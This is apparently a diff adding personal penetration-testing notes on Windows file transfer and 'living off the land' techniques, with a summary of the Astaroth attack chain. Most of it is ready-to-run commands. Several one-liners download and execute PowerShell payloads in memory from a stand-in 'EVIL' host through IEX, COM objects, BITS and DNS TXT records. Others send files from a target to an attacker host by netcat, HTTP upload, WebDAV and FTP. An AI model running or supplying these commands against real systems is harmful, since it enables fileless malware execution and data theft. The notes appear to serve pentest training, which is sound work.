@@ -1,0 +1,178 @@
+LOLBAS has a lot of windows-specific methods to 'Live off the Land' when performing a pentest
+such as file transfer using:
+bitsadmin /create 1
+bitsadmin /addfile 1 http://<host-ip>:<port>/bingus.txt C:\User\Desktop\bingus.txt
+bitsadmin /resume 1
+bitsadmin /complete 1
+
+
+
+LNK or .lnk files path to a target file or executable (windows shortcut file)
+
+WMIC tool in windows is the Windows Management Instrumentation Command-line tool
+^ legacy windows cli -- lets you ask about the system's hardware, software, users, processes, patches, etc.
+
+Astaroth attack:
+spear-phishing a LNK file
+LNK executes wmic with /Format parameter, which allows download and execution of JS code
+JS code can download thee payloads by using the Bitsadmin tool.
+all payloads were base64-encoded and decoded using the certutil tool -> DLL files loaded
+the regsvr32 tool was used to load one of the decoded DLLs, which decrypted and loaded other files for the attack
+final payload, Astaroth was injected into the Userinit process
+
+
+WINDOWS BASE64 TRANSFER METHOD:
+check hash (host):
+md5sum <file>
+
+Convert file to base64 (host):
+cat <file> | base64 -w 0; echo
+
+Copy content to windows powershell (target):
+[IO.File]::WriteAllBytes("C:\Users\Public\<filename>", [Convert]::FromBase64String("<file base64>"))
+
+confirm file hash is fine (target):
+Get-FileHash C:\Users\Public\<filename> -Algorithm md5
+
+If it was successful, the hash will be the same!
+
+
+WINDOWS PS DOWNLOADFILE DOWNLOAD METHOD:
+If you are hosting via some url or with netcat (target):
+(New-Object Net.WebClient).DownloadFile('<target file url>', '<output file name>')
+
+
+WINDOWS PS DOWNLOADSTRING FILELESS METHOD:
+This will execute the payload directly in memory (target file in this case might be a .ps1 file)
+This will download the payload and execute it directly without leaving a file! (target):
+IEX (New-Object Net.WebClient).DownloadString('<target file url>')
+OR PIPE
+(New-Object Net.WebClient).DownloadString('<target file url>') | IEX
+
+
+WINDOWS PS3 INVOKE-WEBREQUEST DOWNLOAD METHOD:
+Invoke-WebRequest <target file url> -OutFile <target file name.ps1>
+
+Sometimes Internet Explorer first-launch configuration hasn't been completed, and prevents the downloads, in this case use:
+-UseBasicParsing
+
+
+OTHER METHODS:
+# PowerShell 3.0+
+IEX (iwr 'http://EVIL/evil.ps1')
+
+# hidden IE com object
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+
+# Msxml2.XMLHTTP COM object
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+
+# WinHttp COM object (not proxy aware!)
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+
+# using bitstransfer- touches disk!
+Import-Module bitstransfer;Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;$r=gc $env:temp\t;rm $env:temp\t; iex $r
+
+# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)
+#   code to execute needs to be a base64 encoded string stored in a TXT record
+IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))
+
+
+WINDOWS SMB DOWNLOAD METHOD:
+Create a (host) SMB server:
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+OR CREDENTIALED:
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user <setusername> -password <setpassword>
+
+Then download from the SMB server (target):
+copy \\<host-ip>\share\<target-file>
+OR CREDENTIALED:
+net use n: \\<host-ip>\share /user:<setusername> <setpassword>
+
+
+WINDOWS FTP DOWNLOAD METHOD:
+Create a (host) FTP server:
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port <setport>
+
+Download (target) from hosted FTP server via PS:
+(New-Object Net.WebClient).DownloadFile('ftp://<host-ip>/<filename>', 'C:\Users\Public\<filename>')
+
+WINDOWS FTP COMMANDS DOWNLOAD METHOD:
+Create a (host) FTP server:
+sudo pip3 install pyftpdlib
+sudo python3 -m pyftpdlib --port <setport>
+
+create a small text file called ftpcommand.txt which contains FTP commands (TARGET):
+echo open <host-ip> > ftpcommand.txt 		# opens up our ip
+echo USER anonymous >> ftpcommand.txt 		# login as anonymous
+echo binary >> ftpcommand.txt 		# transfers file in binary mode
+echo GET <file-name> >> ftpcommand.txt 		# gets the specific file name from ftpsv
+echo bye >> ftpcommand.txt
+
+Then execute the command (target):
+ftp -v -n -s:ftpcommand.txt
+
+
+TARGET PS BASE64 ENCODE -> HOST DECODE:
+Encode file on the target and print string:
+[Convert]::ToBase64String((Get-Content -path "<filename-path>" -Encoding byte))
+
+Then get hash on target file:
+Get-FileHash "<filename-path>" -Algorithm MD5 | select Hash
+
+Decode base64 string on host:
+echo <file-base64-string> | base64 -d > <filename>
+
+and check the hash on the host to confirm file integrity:
+md5sum <filename>
+
+
+TARGET PS -> HOST via UPLOADSERVER:
+Host upload server on host:
+pip3 install uploadserver
+python3 -m uploadserver
+
+Then PS target to upload file to host:
+Invoke-FileUpload -Uri http://<host-ip>:8000/upload -File <filename-path>
+
+TARGET B64 STRING -> HOST DECODE via NetCat:
+On target, convert file to b64 string:
+$b64 = [System.convert]::ToBase64String((Get-Content -Path '<filename-path>' -Encoding Byte))
+Invoke-WebRequest -Uri http://<host-ip>:8000/ -Method POST -Body $b64
+
+Then use netcat to listen on the host:
+nc -lvnp 8000
+
+and decode the string on the host:
+echo <b64> | base64 -d -w 0 > <filename>
+
+
+WEBDAV UPLOAD:
+on host machine:
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=<setport> --root=/<path-to-dir> --auth=anonymous
+
+on the target machine you can connect to the webdav share using:
+dir \\<host-ip>\<dir-name>
+
+you can upload from target to host using:
+copy <filename-path> \\<host-ip>\<dir-name>\
+
+
+FTP UPLOAD:
+on host:
+sudo python3 -m pyftpdlib --port <setport> --write
+
+on target:
+(New-Object Net.WebClient).UploadFile('ftp://<host-name>/', '<filename-path>')
+
+
+OR FTP COMMAND FILE ON TARGET:
+echo open <host-ip> > ftpcommand.txt 		# opens up our ip
+echo USER anonymous >> ftpcommand.txt 		# login as anonymous
+echo binary >> ftpcommand.txt 		# transfers file in binary mode
+echo PUT <file-name> >> ftpcommand.txt 		# uploads specific file
+echo bye >> ftpcommand.txt
+ftp -v -=n -s:ftpcommand.txt
+
